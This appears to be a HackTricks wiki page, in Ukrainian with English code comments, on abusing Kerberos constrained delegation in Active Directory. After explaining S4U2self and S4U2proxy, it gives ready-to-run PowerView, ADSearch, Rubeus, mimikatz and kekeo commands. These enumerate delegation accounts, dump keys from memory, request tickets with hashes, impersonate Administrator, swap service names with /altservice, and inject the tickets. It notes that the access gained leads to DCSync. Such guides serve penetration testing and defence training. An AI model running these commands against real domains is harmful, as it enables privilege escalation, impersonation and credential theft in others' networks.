# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Використовуючи це, адміністратор домену може **дозволити** комп'ютеру **видавати себе за користувача або комп'ютер** проти будь-якого **сервісу** машини.

- **Сервіс для користувача самостійно (_S4U2self_):** Якщо **обліковий запис сервісу** має значення _userAccountControl_, що містить [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), тоді він може отримати TGS для себе (сервісу) від імені будь-якого іншого користувача.
- **Сервіс для користувача проксі (_S4U2proxy_):** **Обліковий запис сервісу** може отримати TGS від імені будь-якого користувача до сервісу, встановленого в **msDS-AllowedToDelegateTo.** Для цього спочатку потрібен TGS від того користувача до себе, але він може використовувати S4U2self, щоб отримати цей TGS перед запитом іншого.

**Примітка**: Якщо користувач позначений як ‘_Обліковий запис є чутливим і не може бути делегований_’ в AD, ви **не зможете видавати себе за** них.

Це означає, що якщо ви **компрометуєте хеш сервісу**, ви можете **видавати себе за користувачів** і отримати **доступ** від їх імені до будь-якого **сервісу** на вказаних машинах (можливий **privesc**).

Більше того, ви **не тільки матимете доступ до сервісу, за який користувач може видавати себе, але й до будь-якого сервісу**, оскільки SPN (ім'я сервісу, що запитується) не перевіряється (в квитку ця частина не зашифрована/не підписана). Тому, якщо у вас є доступ до **CIFS сервісу**, ви також можете отримати доступ до **HOST сервісу**, використовуючи прапорець `/altservice` в Rubeus, наприклад.

Також, **доступ до сервісу LDAP на DC** є тим, що потрібно для експлуатації **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
- Крок 1: **Отримати TGT дозволеної служби**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Є **інші способи отримати TGT квиток** або **RC4** чи **AES256** без того, щоб бути SYSTEM на комп'ютері, такі як Printer Bug та неконтрольована делегація, NTLM релеювання та зловживання службою сертифікатів Active Directory.
>
> **Просто маючи цей TGT квиток (або його хеш), ви можете виконати цю атаку без компрометації всього комп'ютера.**

- Step2: **Отримати TGS для служби, що видає себе за користувача**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Більше інформації на ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

{{#include ../../banners/hacktricks-training.md}}
